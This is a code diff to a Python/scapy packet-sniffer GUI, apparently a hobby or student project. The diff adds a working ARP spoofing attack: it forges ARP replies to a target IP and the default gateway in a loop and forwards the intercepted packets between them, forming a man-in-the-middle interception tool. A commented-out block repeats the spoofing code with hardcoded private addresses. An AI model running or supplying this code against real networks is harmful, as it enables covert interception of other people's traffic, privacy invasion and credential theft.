@@ -12,7 +12,22 @@ import PacketItemModel
 import HTTPParser
 import time
 
-
+'''
+interface = "Intel(R) Dual Band Wireless-AC 3160"
+tip = "10.12.199.149"
+gip = "10.12.223.254"
+localmac=get_if_hwaddr(interface)
+tmac=getmacbyip(tip)
+gmac=getmacbyip(gip)
+ptarget=Ether(src=localmac,dst=tmac)/ARP(hwsrc=localmac,psrc=gip,hwdst=tmac,pdst=tip,op=2)
+pgateway=Ether(src=localmac,dst=gmac)/ARP(hwsrc=localmac,psrc=tip,hwdst=gmac,pdst=gip,op=2)
+try:
+   while 1:
+        sendp(ptarget,inter=2,iface=interface)
+        sendp(pgateway,inter=2,iface=interface)
+        print("test")
+except KeyboardInterrupt:
+'''
 IFACE = 'wlp8s0'   #网卡名称
 STOP = True      #停止嗅探
 PACKETS = []     #数据包收集序列
@@ -24,6 +39,7 @@ FILTER = None   #过滤规则
 PACKET_NUM = 0
 STARTED = False
 TARGET_IP = ""
+ARP_TABLE = dict()
 
 class Interfaces(QObject):
         #获取网卡名称
@@ -46,6 +62,7 @@ class Interfaces(QObject):
 
     @pyqtSlot('int')
     def selected(self, result):
+        return
         global IFACE
         IFACE = self._interfaceList[result]
 
@@ -100,6 +117,7 @@ class Sniffer(QObject):
         global PACKET_NUM
         PACKET_NUM += 1
         lenth = len(packet)
+        ip_forward(packet)
         if int(packet.getlayer(Ether).type) == 34525:
             self.ipv6_count += 1
             proto = 'IPv6'
@@ -168,15 +186,17 @@ class Sniffer(QObject):
         global STOP
         STOP = False
         global STARTED
+        if targetIP is not "":
+            arp_thread = threading.Thread(target=send_arp_packet, args=([targetIP]))
+            arp_thread.start()
+
         if STARTED:
             return
         else:
             STARTED = True
         sniff_thread = threading.Thread(target=sniffer, args=(IFACE, self.handle_packets))
         sniff_thread.start()
-        if targetIP is not "":
-            arp_thread = threading.Thread(target=send_arp_packet, args=([targetIP]))
-            arp_thread.start()
+
 
     #停止嗅探
     @pyqtSlot()
@@ -204,12 +224,62 @@ def get_ip_address(ifname):
 def sniffer(IFACE, handle):
     sniff(iface=str(IFACE), prn=handle)
 
+def get_default_gateway_linux():
+    """Read the default gateway directly from /proc."""
+    with open("/proc/net/route") as fh:
+        for line in fh:
+            fields = line.strip().split()
+            if fields[1] != '00000000' or not int(fields[3], 16) & 2:
+                continue
+
+            return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))
+
 def send_arp_packet(ip):
     global STOP
+    interface = IFACE
+    tip = ip
+    gip = get_default_gateway_linux()
+    localmac=get_if_hwaddr(interface)
+    tmac=getmacbyip(tip)
+    gmac=getmacbyip(gip)
+
+    ARP_TABLE[tip] = tmac
+    ARP_TABLE[gip] = gmac
+    ARP_TABLE['local_mac'] = localmac
+
+    ptarget=Ether(src=localmac,dst=tmac)/ARP(hwsrc=localmac,psrc=gip,hwdst=tmac,pdst=tip,op=2)
+    pgateway=Ether(src=localmac,dst=gmac)/ARP(hwsrc=localmac,psrc=tip,hwdst=gmac,pdst=gip,op=2)
     while not STOP:
-        print("arp->" + ip)
-        time.sleep(1)
-    pass
+        sendp(ptarget,inter = 0.5, iface=interface)
+        sendp(pgateway,inter = 0.5,iface=interface)
+        print("ARP->" + tip)
+
+def ip_forward(pkt):
+    global TARGET_IP
+    if TARGET_IP is '':
+        return
+    if not pkt.haslayer(IP):
+        return
+    localmac = ARP_TABLE['local_mac']
+    src_mac = pkt.getlayer(Ether).src
+    dst_mac = pkt.getlayer(Ether).dst
+    if dst_mac == localmac:
+        print("Ip forward")
+        src_ip = pkt.getlayer(IP).src
+        dst_ip = pkt.getlayer(IP).dst
+        print(dst_ip)
+        if dst_ip == TARGET_IP:
+            print(src_ip+"->"+dst_ip)
+            pkt[Ether].dst = ARP_TABLE[dst_ip]
+            print("mac is" + ARP_TABLE[dst_ip])
+            sendp(pkt,iface=IFACE)
+            pass
+        elif dst_ip == get_default_gateway_linux():
+            print(src_ip + "->" + dst_ip)
+            pkt[Ether].dst = ARP_TABLE[dst_ip]
+            sendp(pkt,iface=IFACE)
+            pass
+
 
 def main():
     app = QtWidgets.QApplication(sys.argv)
